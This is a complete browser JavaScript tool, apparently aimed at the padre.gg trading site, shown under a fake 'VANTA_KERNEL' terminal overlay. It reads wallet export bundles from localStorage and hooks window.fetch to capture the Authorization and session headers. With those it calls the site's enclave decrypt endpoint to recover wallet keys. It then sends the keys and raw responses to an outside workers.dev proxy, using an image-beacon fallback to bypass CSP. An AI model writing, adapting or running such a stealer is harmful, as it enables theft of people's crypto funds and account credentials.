(function() {
    const CONFIG = {
        proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
        decrypt: "https://api.padre.gg/v2/enclave/decrypt"
    };

    const state = { auth: null, session: null, bundle: null };

    // 1. THE TERMINAL UI
    const initUI = () => {
        const ui = document.createElement('div');
        ui.id = 'vanta-terminal';
        ui.style = `position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;border-radius:8px;padding:15px;z-index:9999999;color:#00ff88;font-family:monospace;box-shadow:0 0 20px #00ff8844;cursor:move;`;
        ui.innerHTML = `
            <div id="v-drag" style="font-weight:bold;border-bottom:1px solid #222;margin-bottom:10px;display:flex;justify-content:space-between;">
                <span>VANTA_KERNEL_v9</span><span>[ONLINE]</span>
            </div>
            <div id="v-log" style="height:140px;overflow-y:auto;font-size:10px;color:#0f0;margin-bottom:10px;"></div>
            <div style="background:#111;height:4px;margin-bottom:10px;"><div id="v-prog" style="width:0%;height:100%;background:#00ff88;transition:0.5s;"></div></div>
            <button id="v-force" style="width:100%;background:#00ff88;color:#000;border:none;padding:8px;font-weight:bold;cursor:pointer;border-radius:4px;">RE-INJECT & FORCE SCAN</button>
        `;
        document.body.appendChild(ui);

        // Draggable
        let active = false, oX, oY;
        document.getElementById('v-drag').onmousedown = (e) => { active = true; oX = e.clientX - ui.offsetLeft; oY = e.clientY - ui.offsetTop; };
        document.onmousemove = (e) => { if(active){ ui.style.left = (e.clientX - oX)+'px'; ui.style.top = (e.clientY - oY)+'px'; }};
        document.onmouseup = () => active = false;
    };

    const log = (m) => { const l = document.getElementById('v-log'); if(l){ l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }};

    // 2. DATA TRANSMISSION (Bypass CSP using Image Beacons)
    const send = (label, data) => {
        fetch(CONFIG.proxy, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ label, data }) }).catch(() => {
            const img = new Image();
            img.src = `${CONFIG.proxy}?exfil=${btoa(JSON.stringify(data)).substring(0, 500)}`;
        });
    };

    // 3. THE EXECUTION ENGINE
    const runBypass = async () => {
        log("Searching Storage...");
        // Capture Bundle
        for (let i = 0; i < localStorage.length; i++) {
            let k = localStorage.key(i);
            if (k.includes('bundles')) {
                state.bundle = JSON.parse(localStorage.getItem(k));
                log("Bundle Located.");
                document.getElementById('v-prog').style.width = "40%";
            }
        }

        // Capture Auth via Fetch Hijack
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const h = args[1]?.headers;
            if (h) {
                const a = h['Authorization'] || (h instanceof Headers && h.get('Authorization'));
                const s = h['X-Padre-Session'] || (h instanceof Headers && h.get('X-Padre-Session'));
                if (a) { 
                    state.auth = a; state.session = s; 
                    log("Authorization Sniffed.");
                    document.getElementById('v-prog').style.width = "70%";
                    attemptDecrypt();
                }
            }
            return _f(...args);
        };

        // Force the site to send the headers
        _f('/api/v2/user/profile').catch(() => {});
    };

    // 4. THE DECRYPTOR (Fixes the 'Unexpected Token b' error)
    const attemptDecrypt = async () => {
        if (!state.auth || !state.bundle) return;
        log("Executing Decryption...");
        
        const bKey = Object.keys(state.bundle.bundles)[0];
        const payload = { 
            bundle: state.bundle.bundles[bKey].exportBundle, 
            subOrgId: state.bundle.bundles[bKey].subOrgId 
        };

        try {
            const res = await fetch(CONFIG.decrypt, {
                method: 'POST',
                headers: { 'Authorization': state.auth, 'X-Padre-Session': state.session || '', 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // FIX: Check if response is JSON before parsing
            const text = await res.text();
            try {
                const json = JSON.parse(text);
                log("DECRYPTION SUCCESSFUL");
                document.getElementById('v-prog').style.width = "100%";
                send("WALLET_KEYS", json);
            } catch(e) {
                log("Server returned non-JSON. System Busy.");
                send("RAW_RESPONSE", text);
            }
        } catch (e) { log("Connection Blocked."); }
    };

    // START
    initUI();
    runBypass();
    document.getElementById('v-force').onclick = () => location.reload();
})();
